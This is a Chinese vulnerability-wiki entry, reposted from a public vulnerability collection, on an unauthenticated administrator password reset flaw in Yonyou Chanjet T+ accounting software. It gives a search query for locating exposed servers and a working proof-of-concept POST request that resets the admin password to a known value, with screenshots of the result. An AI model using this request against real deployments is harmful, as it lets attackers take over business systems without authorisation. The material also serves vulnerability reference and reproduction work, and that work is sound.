---
title: "用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞"
date: 2026-10-16 09:11:14
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "用友"
tags:
  - "用友"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

用友 畅捷通T+ RecoverPassword.aspx 存在未授权管理员密码修改漏洞，攻击者可以通过漏洞修改管理员账号密码登录后台

## 漏洞影响

```
用友 畅捷通T+
```

## 网络测绘

```
app="畅捷通-TPlus"
```

## 漏洞复现

登录页面

![image-20220909104559292](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202209091048224.png)

验证POC, 重置账号密码为 `admin/123qwe`

```
POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd

{"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}
```

![image-20220909104816391](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202209091048450.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9AT%2B-RecoverPassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E.md)
